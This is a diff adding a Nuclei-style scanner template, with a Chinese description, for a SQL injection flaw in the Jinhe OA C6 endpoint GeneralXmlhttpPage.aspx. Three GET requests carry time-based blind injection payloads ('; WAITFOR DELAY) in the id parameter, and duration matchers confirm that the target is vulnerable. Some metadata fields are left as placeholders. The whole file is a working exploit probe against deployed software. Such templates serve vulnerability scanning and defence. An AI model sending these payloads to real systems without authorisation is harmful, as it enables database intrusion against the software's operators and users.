@@ -1,0 +1,25 @@
+id: Jhsoft-c6-GeneralXmlhttpPage-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 金和OAv C6 接口 /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx 存在SQL注入漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E9%87%91%E5%92%8COA-C6-GeneralXmlhttpPage.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:3%27--"
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:6%27--"
+      - "{{BaseURL}}/C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:9%27--"
+      
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
